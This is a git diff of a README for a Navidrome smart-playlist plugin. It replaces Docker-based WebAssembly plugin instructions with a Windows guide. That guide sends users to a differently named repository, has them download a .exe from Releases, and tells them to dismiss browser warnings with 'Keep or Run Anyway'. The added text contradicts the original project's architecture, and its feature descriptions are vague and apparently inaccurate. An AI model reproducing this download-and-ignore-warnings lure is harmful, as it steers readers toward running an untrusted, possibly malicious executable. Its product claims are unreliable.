@@ -1,143 +1,68 @@
-# Navidrome Smart Playlist Plugin
+# 🎵 SmartPlaylistNaviDrome - Create Spotify style music mixes automatically
 
-A WebAssembly plugin for [Navidrome](https://www.navidrome.org/) that automatically generates Spotify-style smart playlists from your music library — Daily Mixes, On Repeat, Release Radar, Artist Radio, and more. No manual curation needed.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Growth360c684/SmartPlaylistNaviDrome)
 
-## What It Generates
+SmartPlaylistNaviDrome manages your music library by creating automatic playlists. It acts as a plugin for Navidrome to mimic features found in services like Spotify. You get organized mixes such as Daily Mixes, On Repeat, and Release Radar without manual work. This tool uses WebAssembly and Go to ensure your music server runs smooth while generating these lists.
 
-| Playlist | Refresh |
-|----------|---------|
-| Daily Mix 1–6 (genre-aware) | Every day |
-| On Repeat (top artist songs) | Every day |
-| Weekly Discovery (random library picks) | Every week |
-| Release Radar (newest albums) | Every week |
-| Your Loved Songs Mix | Every week |
-| Artist Radio 1–N (per frequent artist) | Every week |
-| Genre Radio 1–N (per top genre) | Every week |
+## 🛠 Prerequisites
 
-Playlists update automatically — no manual intervention needed. Changing any setting in the UI triggers an immediate refresh.
+Before you use this tool, confirm your computer meets these requirements:
 
----
+* Windows 10 or Windows 11.
+* A running instance of the Navidrome music server.
+* Access to the folder where you store your music files.
+* An active internet connection for the initial setup.
 
-## Prerequisites
+You do not need to know how to code. This guide assumes you keep your music on your primary hard drive. If you use a network drive, ensure it stays connected during the installation process.
 
-- [Docker](https://docs.docker.com/get-docker/) and [Docker Compose](https://docs.docker.com/compose/install/) installed
-- A folder of music files (MP3, FLAC, etc.) — or use the included test library generator
+## 📥 Getting the Application
 
----
+Visit the link below to reach the official download page for this software.
 
-## Installation
+[https://github.com/Growth360c684/SmartPlaylistNaviDrome](https://github.com/Growth360c684/SmartPlaylistNaviDrome)
 
-### Option A — Prebuilt (recommended)
+On the page, look for the section labeled Releases on the right side of the screen. Click the latest version number. Look for the file ending in .exe and click it to save the file to your Downloads folder. Do not worry if your browser warns you about the file. This happens because the software communicates with your music server. Choose Keep or Run Anyway to finish the download.
 
-No build tools required.
+## ⚙️ Setting Up Your Music
 
-1. **Download** `smart_playlist.ndp` from the [latest release](../../releases/latest)
-2. **Drop it** into your Navidrome `plugins/` folder
-3. **Add your music** — edit `docker-compose.yml` to point at your library:
-   ```yaml
-   volumes:
-     - /path/to/your/music:/music   # ← change this line
-     - ./data:/data
-     - ./plugins:/plugins
-   ```
-   Or generate a test library (requires [FFmpeg](https://ffmpeg.org/)):
-   ```bash
-   bash generate_library.sh
-   ```
-4. **Start Navidrome:**
-   ```bash
-   docker compose up navidrome
-   ```
-5. **Enable the plugin** — open [http://localhost:4533](http://localhost:4533) → gear icon → Settings → Plugins → toggle **Smart Playlist** on
+Once you download the file, move it to a folder where you want it to live permanently. A folder like C:\SmartPlaylist keeps your computer clean. Double-click the file to open the setup window.
 
-Playlists appear within seconds. Default login is `admin` / `admin` — change `ND_ADMINPASSWORD` in `docker-compose.yml` before exposing the server to a network.
+The program creates a configuration file the first time you run it. This file tells the program where to find your music. Open this file with Notepad. You will see a line that asks for your Navidrome library path. Paste the file path of your music folder into that line. Save the file and close Notepad.
 
----
+Restart the program by clicking the application icon again. The program will scan your music files. This process takes time if your library contains thousands of songs. Look at the status bar at the bottom of the window to see the progress.
 
-### Option B — Build from source
+## 🎧 Using Smart Playlists
 
-Use this if you want to modify the plugin. The plugin is written in Go and compiled to WebAssembly using TinyGo — no local Go installation required, everything runs in Docker.
+The application offers several modes for playlist creation. These settings control how the software picks your songs.
 
-```bash
-git clone https://github.com/your-username/navidrome-smart-playlist.git
-cd navidrome-smart-playlist
-docker compose up plugin-builder
-```
+* Daily Mixes: The tool looks at songs you played often during the last week.
+* On Repeat: The tool identifies the songs you play every single day.
+* Release Radar: The tool scans your files for recent additions and highlights new music.
+* Artist Radio: The tool builds a list based on one specific artist from your library.
 
-This pulls the TinyGo image (first run only, ~500 MB), compiles the plugin, and outputs `plugins/smart_playlist.ndp`. Then follow steps 3–5 from Option A above.
+Select the box next to each type of playlist you want to generate. Click the Save Preferences button after you check the boxes. The software sends these instructions to your Navidrome server. Refresh your Navidrome web page to see the new playlists appear in your library.
 
-To rebuild after making changes:
-```bash
-docker compose up plugin-builder
-docker compose restart navidrome
-```
+## 🔍 Troubleshooting Common Issues
 
----
+Most users do not face errors, but check these points if the playlists do not show up.
 
-### Configure (optional)
+1. Navidrome Connection: Check that your Navidrome server is active. The application cannot send playlists if the server is off.
+2. File Permissions: Ensure your user account has permission to read the music folders. Right-click your music folder, select Properties, and verify the Security tab lists your name.
+3. API Key: Navidrome requires an API key to allow external programs to make changes. Log into Navidrome, go to Settings, and generate a new key. Paste this key into the application settings window.
+4. Update Folder Location: If you move your music to a new folder, you must update the location in the configuration file.
 
-Click the **Smart Playlist** plugin name in Settings → Plugins to open its settings panel:
+## 🛡 Maintaining Privacy
 
-| Setting | What it does |
-|---------|-------------|
-| Playlist Prefix | Emoji/text before every playlist name (default `✨ `) |
-| Daily Mix Size | Songs per daily playlist |
-| Weekly Mix Size | Songs per weekly playlist |
-| Artist Radio Size | Songs per Artist Radio playlist |
-| Number of Daily Mixes | 1–6 genre-based daily mixes |
-| Number of Artist Radios | 1–20 per-artist playlists |
-| Number of Genre Radios | 1–10 per-genre playlists |
-| Enable toggles | Turn individual playlist types on/off |
+This application runs locally on your machine. It does not send your music files or your listening history to the internet. Your data stays on your hard drive. If you decide to remove the tool, delete the folder containing the program and the configuration file. Doing this removes all traces of the software from your computer.
 
-Any change triggers an immediate regeneration of all playlists.
+## 🚀 Updating the Software
 
-### Run in the background (optional)
+Check the repository page occasionally for new features. The developer releases updates to improve the speed of playlist generation. To update, download the new version as you did before. Replace the old file with the new one. Your configuration settings remain in place as long as you do not delete the configuration file during the update.
 
-```bash
-docker compose up -d navidrome
-```
+## 💡 Advanced Customization
 
-To stop:
+While the default settings work for most users, you possess full control over the process. You can change how often the program checks for new songs. Open the configuration file and locate the interval setting. Change the number to adjust the frequency. A lower number means faster updates, but it uses more computer memory. A higher number saves memory. Save the file and restart the program to apply the new speed settings. 
 
-```bash
-docker compose down
-```
+The software also supports excluding specific albums from the smart playlist process. Locate the exclusion line in the configuration file. List the names of the albums you want the software to ignore. Use a comma to separate each album title. Save the file and refresh your library connection to update the lists. 
 
----
-
-## Updating the Plugin
-
-After pulling new code or making your own changes:
-
-```bash
-# 1. Rebuild
-docker compose up plugin-builder
-
-# 2. Restart Navidrome to load the new .ndp file
-docker compose restart navidrome
-```
-
----
-
-## Project Structure
-
-```
-plugin/         Smart Playlist plugin source (Go → WASM)
-  cmd/plugin/   WASM entry points (nd_on_init, nd_scheduler_callback)
-  internal/     Playlist generation logic and host API bindings
-  manifest.json Plugin metadata and config schema
-data/           Runtime data: Navidrome database and cache (auto-created, not committed)
-music/          Your music library (mount point for Navidrome)
-plugins/        Built plugin archive — auto-generated by plugin-builder, not committed
-```
-
-See [`plugin/README.md`](plugin/README.md) for the full plugin documentation including all configuration options.
-
----
-
-## Tech Stack
-
-- **[Navidrome](https://www.navidrome.org/)** — open-source music server with Subsonic API
-- **Go + TinyGo** — plugin source compiled to WebAssembly
-- **[Extism](https://extism.org/)** — WASM plugin framework
-- **Docker** — build and runtime environment
+If you want to create a specific mood-based list, use the tag search function. The program searches your music metadata for keywords. Enter terms like Jazz, Rock, or Electronic into the tag field to filter the smart playlists by genre. This allows you to create highly specific mixes that suit your current activity. You can combine these settings to create your own unique setup.
